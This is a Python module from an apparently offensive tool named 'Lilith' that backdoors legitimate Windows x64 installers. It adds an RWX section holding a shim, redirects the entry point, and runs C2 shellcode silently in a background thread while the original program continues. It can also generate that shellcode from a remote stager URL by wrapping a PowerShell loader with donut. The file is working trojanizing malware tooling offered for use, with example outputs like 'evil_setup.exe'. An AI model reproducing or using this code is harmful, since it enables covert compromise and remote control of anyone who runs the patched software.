"""
Lilith — PE Backdoor Patcher

Injects C2 shellcode into a legitimate PE (e.g. an installer) so that when
the target user runs it, shellcode executes silently in a background thread
while the original program continues normally.

Technique:
  1.  Compile a small x64 shim (pe_stub_x64.c → flat binary via pe_stub.ld).
  2.  Add a new RWX section to the target PE containing:
        [0x000] shim code   — PEB walk → CreateThread(shellcode)
        [0x1F0] stub_magic  — locator  (0xCAFEBABEDEADBEEF)
        [0x1F8] oep_rva     — original OEP (patched here)
        [0x200] shellcode   — donut-wrapped PS loader
  3.  Patch AddressOfEntryPoint → new section RVA.
  4.  Shim creates a background thread for the shellcode, then jmps original OEP.

Usage (standalone):
    from builders.patcher import backdoor_pe
    backdoor_pe("Setup.exe", shellcode_bytes, "evil_setup.exe")

Usage (via lilith CLI):
    lilith patch --target Setup.exe --output evil_setup.exe
"""

import os
import struct
import random
import string
import tempfile
import shutil
import subprocess

import pefile

# ── paths ─────────────────────────────────────────────────────────────────────

_TEMPLATES = os.path.join(os.path.dirname(os.path.dirname(__file__)), "templates")
_STUB_C    = os.path.join(_TEMPLATES, "pe_stub_x64.c")
_STUB_LD   = os.path.join(_TEMPLATES, "pe_stub.ld")
_CC        = "x86_64-w64-mingw32-gcc"

# Offsets within the flat stub binary
_MAGIC_VAL  = 0xCAFEBABEDEADBEEF   # locator embedded in stub binary
_SC_DELTA   = 0x10                  # shellcode = &stub_magic + 0x10 (baked in C code)

# PE section characteristics: CNT_CODE | MEM_EXECUTE | MEM_READ | MEM_WRITE
_SEC_FLAGS  = 0xE0000020

# ── stub compilation ───────────────────────────────────────────────────────────

_stub_cache: bytes | None = None

def _pe_to_flat(pe_data: bytes) -> bytes:
    """Extract PE sections as a contiguous flat binary (equivalent to objcopy -O binary)."""
    pe = pefile.PE(data=pe_data)
    min_rva = min(s.VirtualAddress for s in pe.sections)
    max_rva = max(s.VirtualAddress + s.Misc_VirtualSize for s in pe.sections)
    flat = bytearray(max_rva - min_rva)
    for s in pe.sections:
        off  = s.VirtualAddress - min_rva
        data = s.get_data()
        flat[off : off + len(data)] = data
    return bytes(flat)


def _compile_stub() -> bytes:
    """
    Compile pe_stub_x64.c → PE → extract as flat binary.
    Returns raw stub bytes where:
      byte 0          = ShimEntry (guaranteed by -fno-toplevel-reorder)
      byte 0x1F0      = stub_magic (0xCAFEBABEDEADBEEF)
      byte 0x1F8      = oep_rva slot (zero, patched per-target by backdoor_pe)
      byte 0x200 ..   = shellcode appended by backdoor_pe
    """
    global _stub_cache
    if _stub_cache is not None:
        return _stub_cache

    if not shutil.which(_CC):
        raise RuntimeError(f"Compiler not found: {_CC}\n"
                           "  Install: apt install gcc-mingw-w64-x86-64")

    with tempfile.TemporaryDirectory(prefix="lt_stub_") as tmp:
        out = os.path.join(tmp, "stub.exe")
        cmd = [
            _CC,
            "-Os",
            "-fno-stack-protector",
            "-nostdlib", "-nostartfiles",
            "-ffreestanding",
            "-fno-exceptions",
            "-fno-asynchronous-unwind-tables",
            "-fomit-frame-pointer",
            "-fno-ident",
            "-fno-toplevel-reorder",
            f"-Wl,-T,{_STUB_LD}",
            _STUB_C,
            "-o", out,
        ]
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError(f"Stub compile failed:\n{r.stderr}")
        with open(out, "rb") as f:
            flat = _pe_to_flat(f.read())

    magic_bytes = struct.pack("<Q", _MAGIC_VAL)
    magic_off   = flat.find(magic_bytes)
    if magic_off < 0:
        raise RuntimeError("stub_magic not found in compiled stub flat binary")

    expected_sc_off = magic_off + _SC_DELTA
    if magic_off != 0x1F0:
        raise RuntimeError(
            f"stub_magic landed at flat offset {magic_off:#x} instead of 0x1F0 — "
            "compiler changed layout; adjust linker script RVAs"
        )

    # Truncate flat binary at sc_offset (0x200) — everything after is section padding.
    # Shellcode will be appended there by backdoor_pe().
    stub = bytearray(flat)[:expected_sc_off]

    _stub_cache = bytes(stub)
    return _stub_cache


# ── donut wrapper ──────────────────────────────────────────────────────────────

def _donut_ps1(ps1_path: str) -> bytes | None:
    """Convert a .ps1 script to shellcode via donut (-t 2 = PowerShell)."""
    donut_bin = shutil.which("donut")

    if donut_bin:
        with tempfile.TemporaryDirectory(prefix="lt_dnt_") as tmp:
            sc_out = os.path.join(tmp, "sc.bin")
            r = subprocess.run(
                [donut_bin, "-t", "2", "-i", ps1_path, "-o", sc_out],
                capture_output=True, text=True,
            )
            if r.returncode == 0 and os.path.exists(sc_out):
                with open(sc_out, "rb") as f:
                    return f.read()
            print(f"[!] donut failed:\n{r.stderr.strip()}")

    try:
        import donut as _donut_py
        return _donut_py.create(file=ps1_path, type=2)
    except ImportError:
        pass
    except Exception as e:
        print(f"[!] donut Python API failed: {e}")

    return None


# ── PE helpers ─────────────────────────────────────────────────────────────────

def _align_up(val: int, boundary: int) -> int:
    return (val + boundary - 1) & ~(boundary - 1)


def _rand_sec_name() -> bytes:
    name = "." + "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
    return name.encode()[:8].ljust(8, b'\x00')


def _patch_and_add_section(
    pe_data:  bytes,
    sec_name: bytes,
    sec_data: bytes,
    new_oep_rva: int,
) -> bytes:
    """
    Low-level: add one new section to raw PE bytes, patch AddressOfEntryPoint,
    and return the modified PE bytes.
    """
    pe = pefile.PE(data=pe_data)

    file_align = pe.OPTIONAL_HEADER.FileAlignment
    sec_align  = pe.OPTIONAL_HEADER.SectionAlignment

    # Check there is room in the section header table for one more entry
    last_sec    = pe.sections[-1]
    hdr_end_off = (
        pe.DOS_HEADER.e_lfanew
        + 4                                        # PE signature
        + 20                                       # IMAGE_FILE_HEADER (always 20 bytes)
        + pe.FILE_HEADER.SizeOfOptionalHeader
        + pe.FILE_HEADER.NumberOfSections * 40     # existing IMAGE_SECTION_HEADERs
    )
    first_raw   = min(s.PointerToRawData for s in pe.sections if s.PointerToRawData > 0)
    slack       = first_raw - hdr_end_off
    if slack < 40:
        raise RuntimeError(
            f"No room for a new section header (only {slack} bytes free). "
            "Try a different target PE."
        )

    # Compute new section placement
    new_rva     = _align_up(last_sec.VirtualAddress + last_sec.Misc_VirtualSize, sec_align)
    new_rawoff  = _align_up(last_sec.PointerToRawData + last_sec.SizeOfRawData, file_align)
    new_rawsize = _align_up(len(sec_data), file_align)
    new_virtsize = len(sec_data)

    # Build the IMAGE_SECTION_HEADER (40 bytes)
    sec_hdr = struct.pack(
        "<8sIIIIIIHHI",
        sec_name,           # Name
        new_virtsize,       # VirtualSize
        new_rva,            # VirtualAddress
        new_rawsize,        # SizeOfRawData
        new_rawoff,         # PointerToRawData
        0,                  # PointerToRelocations
        0,                  # PointerToLinenumbers
        0,                  # NumberOfRelocations
        0,                  # NumberOfLinenumbers
        _SEC_FLAGS,         # Characteristics (RWX)
    )

    buf = bytearray(pe_data)

    # Write new section header right after the last existing header
    buf[hdr_end_off : hdr_end_off + 40] = sec_hdr

    # Patch PE fields
    pe2 = pefile.PE(data=bytes(buf))
    pe2.FILE_HEADER.NumberOfSections        += 1
    pe2.OPTIONAL_HEADER.AddressOfEntryPoint  = new_oep_rva
    pe2.OPTIONAL_HEADER.SizeOfImage          = _align_up(new_rva + new_virtsize, sec_align)

    buf2 = bytearray(pe2.write())

    # Append section data (file-aligned padded)
    buf2 += sec_data + b'\x00' * (new_rawsize - len(sec_data))

    return bytes(buf2)


# ── public API ─────────────────────────────────────────────────────────────────

def backdoor_pe(
    input_path:  str,
    shellcode:   bytes,
    output_path: str,
    section_name: str | None = None,
) -> bool:
    """
    Inject shellcode into a PE by adding a backdoor section.

    The shim (ShimEntry) runs instead of the original OEP:
      1. Creates a background thread executing the shellcode.
      2. Jumps to the original OEP — the program runs normally.

    input_path   : path to the legitimate target PE (not modified in place)
    shellcode    : raw shellcode bytes (e.g. donut-wrapped PS loader)
    output_path  : path for the backdoored output PE
    section_name : optional fixed section name (randomised if None)

    Returns True on success.
    """
    if not os.path.exists(input_path):
        print(f"[!] Target not found: {input_path}")
        return False

    # Compile (or reuse cached) stub flat binary
    try:
        stub = bytearray(_compile_stub())
    except RuntimeError as e:
        print(f"[!] {e}")
        return False

    # Parse target PE
    try:
        with open(input_path, "rb") as f:
            pe_bytes = f.read()
        pe = pefile.PE(data=pe_bytes)
    except Exception as e:
        print(f"[!] Failed to parse target PE: {e}")
        return False

    if pe.FILE_HEADER.Machine != 0x8664:
        print("[!] Only x64 PE targets are supported.")
        return False

    # Find magic offset in stub, patch oep_rva slot at magic+8
    magic_off    = stub.find(struct.pack("<Q", _MAGIC_VAL))
    oep_rva_off  = magic_off + 8
    orig_oep_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    struct.pack_into("<Q", stub, oep_rva_off, orig_oep_rva)

    # Determine new section RVA (needed to compute new OEP = section_rva + 0)
    last_sec   = pe.sections[-1]
    sec_align  = pe.OPTIONAL_HEADER.SectionAlignment
    new_sec_rva = _align_up(last_sec.VirtualAddress + last_sec.Misc_VirtualSize, sec_align)

    # Build section data: stub (0x200 bytes) + shellcode
    sec_data = bytes(stub) + shellcode

    sname = section_name.encode().ljust(8, b'\x00')[:8] if section_name else _rand_sec_name()

    try:
        patched = _patch_and_add_section(
            pe_bytes,
            sname,
            sec_data,
            new_oep_rva=new_sec_rva,   # ShimEntry is at offset 0 of new section
        )
    except RuntimeError as e:
        print(f"[!] {e}")
        return False

    abs_out = os.path.abspath(output_path)
    with open(abs_out, "wb") as f:
        f.write(patched)

    orig_sz = len(pe_bytes)
    new_sz  = len(patched)
    print(f"[+] Backdoored PE   : {abs_out}")
    print(f"    Original size   : {orig_sz:,} bytes")
    print(f"    Output size     : {new_sz:,} bytes  (+{new_sz - orig_sz:,})")
    print(f"    Section name    : {sname.rstrip(b'\\x00').decode()}")
    print(f"    Section RVA     : {new_sec_rva:#010x}")
    print(f"    Original OEP    : {orig_oep_rva:#010x}")
    print(f"    Shellcode size  : {len(shellcode):,} bytes")
    print( "    Execution model : background thread → original OEP (silent)")
    return True


def backdoor_pe_from_stager(
    input_path:  str,
    stager_url:  str,
    output_path: str,
    section_name: str | None = None,
) -> bool:
    """
    High-level: generate shellcode from stager URL (donut-wrapped PS loader)
    then backdoor the target PE.
    """
    import sys
    sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
    from builders.stager import _compact_exec_loader

    loader_lines = _compact_exec_loader(stager_url)

    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".ps1", delete=False, prefix="lt_ldr_"
    ) as f:
        f.write("\n".join(loader_lines))
        ps1_path = f.name

    print(f"[*] Generating shellcode from PS loader via donut…")
    shellcode = _donut_ps1(ps1_path)
    os.unlink(ps1_path)

    if shellcode is None:
        print("[!] donut unavailable — install: pip install donut-shellcode  or  apt install donut")
        return False

    print(f"[*] Shellcode size: {len(shellcode):,} bytes")
    return backdoor_pe(input_path, shellcode, output_path, section_name)
